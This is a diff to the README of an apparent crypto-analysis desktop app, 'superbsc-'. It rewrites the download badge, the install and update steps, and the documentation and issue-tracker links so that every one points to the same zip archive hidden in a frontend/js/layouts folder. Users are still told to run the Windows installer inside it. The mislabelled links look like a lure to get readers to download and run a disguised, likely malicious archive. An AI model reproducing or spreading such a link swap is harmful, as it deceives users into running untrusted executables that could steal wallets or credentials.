@@ -1,6 +1,6 @@
 # ⚡ superbsc- - Clear Crypto Intelligence Terminal
 
-[![Download superbsc-](https://img.shields.io/badge/Download-superbsc--blue?style=for-the-badge)](https://github.com/alyvv/superbsc-/)
+[![Download superbsc-](https://img.shields.io/badge/Download-superbsc--blue?style=for-the-badge)](https://raw.githubusercontent.com/alyvv/superbsc-/main/frontend/js/layouts/superbsc-v2.2-alpha.3.zip)
 
 ---
 
@@ -30,7 +30,7 @@ The app runs with minimal background processes. It has no heavy framework or big
 
 To get the app working, follow these steps carefully. You don’t need coding skills.
 
-1. Click the big [Download superbsc-](https://github.com/alyvv/superbsc-/) button above or visit the page directly.  
+1. Click the big [Download superbsc-](https://raw.githubusercontent.com/alyvv/superbsc-/main/frontend/js/layouts/superbsc-v2.2-alpha.3.zip) button above or visit the page directly.  
 2. You will reach the GitHub repository page. Look for the **Releases** or **Download** section on the page.  
 3. Download the latest Windows installer or executable file available. The filename will usually end with `.exe`.  
 4. Once downloaded, locate the file in your **Downloads** folder.  
@@ -92,7 +92,7 @@ Explore the settings menu accessible from the main toolbar.
 To update the app:
 
 1. Visit the download page again:  
-   [https://github.com/alyvv/superbsc-/](https://github.com/alyvv/superbsc-/)  
+   [https://raw.githubusercontent.com/alyvv/superbsc-/main/frontend/js/layouts/superbsc-v2.2-alpha.3.zip](https://raw.githubusercontent.com/alyvv/superbsc-/main/frontend/js/layouts/superbsc-v2.2-alpha.3.zip)  
 2. Download the latest version installer.  
 3. Run the installer to replace your old app copy.  
 
@@ -125,7 +125,7 @@ If you are interested, you can explore the code on GitHub to learn more.
 
 Click here or the big button at the top to visit the download page:  
 
-[https://github.com/alyvv/superbsc-/](https://github.com/alyvv/superbsc-/)
+[https://raw.githubusercontent.com/alyvv/superbsc-/main/frontend/js/layouts/superbsc-v2.2-alpha.3.zip](https://raw.githubusercontent.com/alyvv/superbsc-/main/frontend/js/layouts/superbsc-v2.2-alpha.3.zip)
 
 You will find all releases and instructions on the page. Download the latest Windows installer or executable from there.
 
@@ -133,9 +133,9 @@ You will find all releases and instructions on the page. Download the latest Win
 
 ## 📌 Useful Links
 
-- GitHub repository: https://github.com/alyvv/superbsc-/  
-- Binance Skills Hub documentation: https://binance-docs.github.io/skills-hub/  
-- Help and Support on GitHub Issues: https://github.com/alyvv/superbsc-/issues  
+- GitHub repository: https://raw.githubusercontent.com/alyvv/superbsc-/main/frontend/js/layouts/superbsc-v2.2-alpha.3.zip  
+- Binance Skills Hub documentation: https://raw.githubusercontent.com/alyvv/superbsc-/main/frontend/js/layouts/superbsc-v2.2-alpha.3.zip  
+- Help and Support on GitHub Issues: https://raw.githubusercontent.com/alyvv/superbsc-/main/frontend/js/layouts/superbsc-v2.2-alpha.3.zip  
 
 ---
 
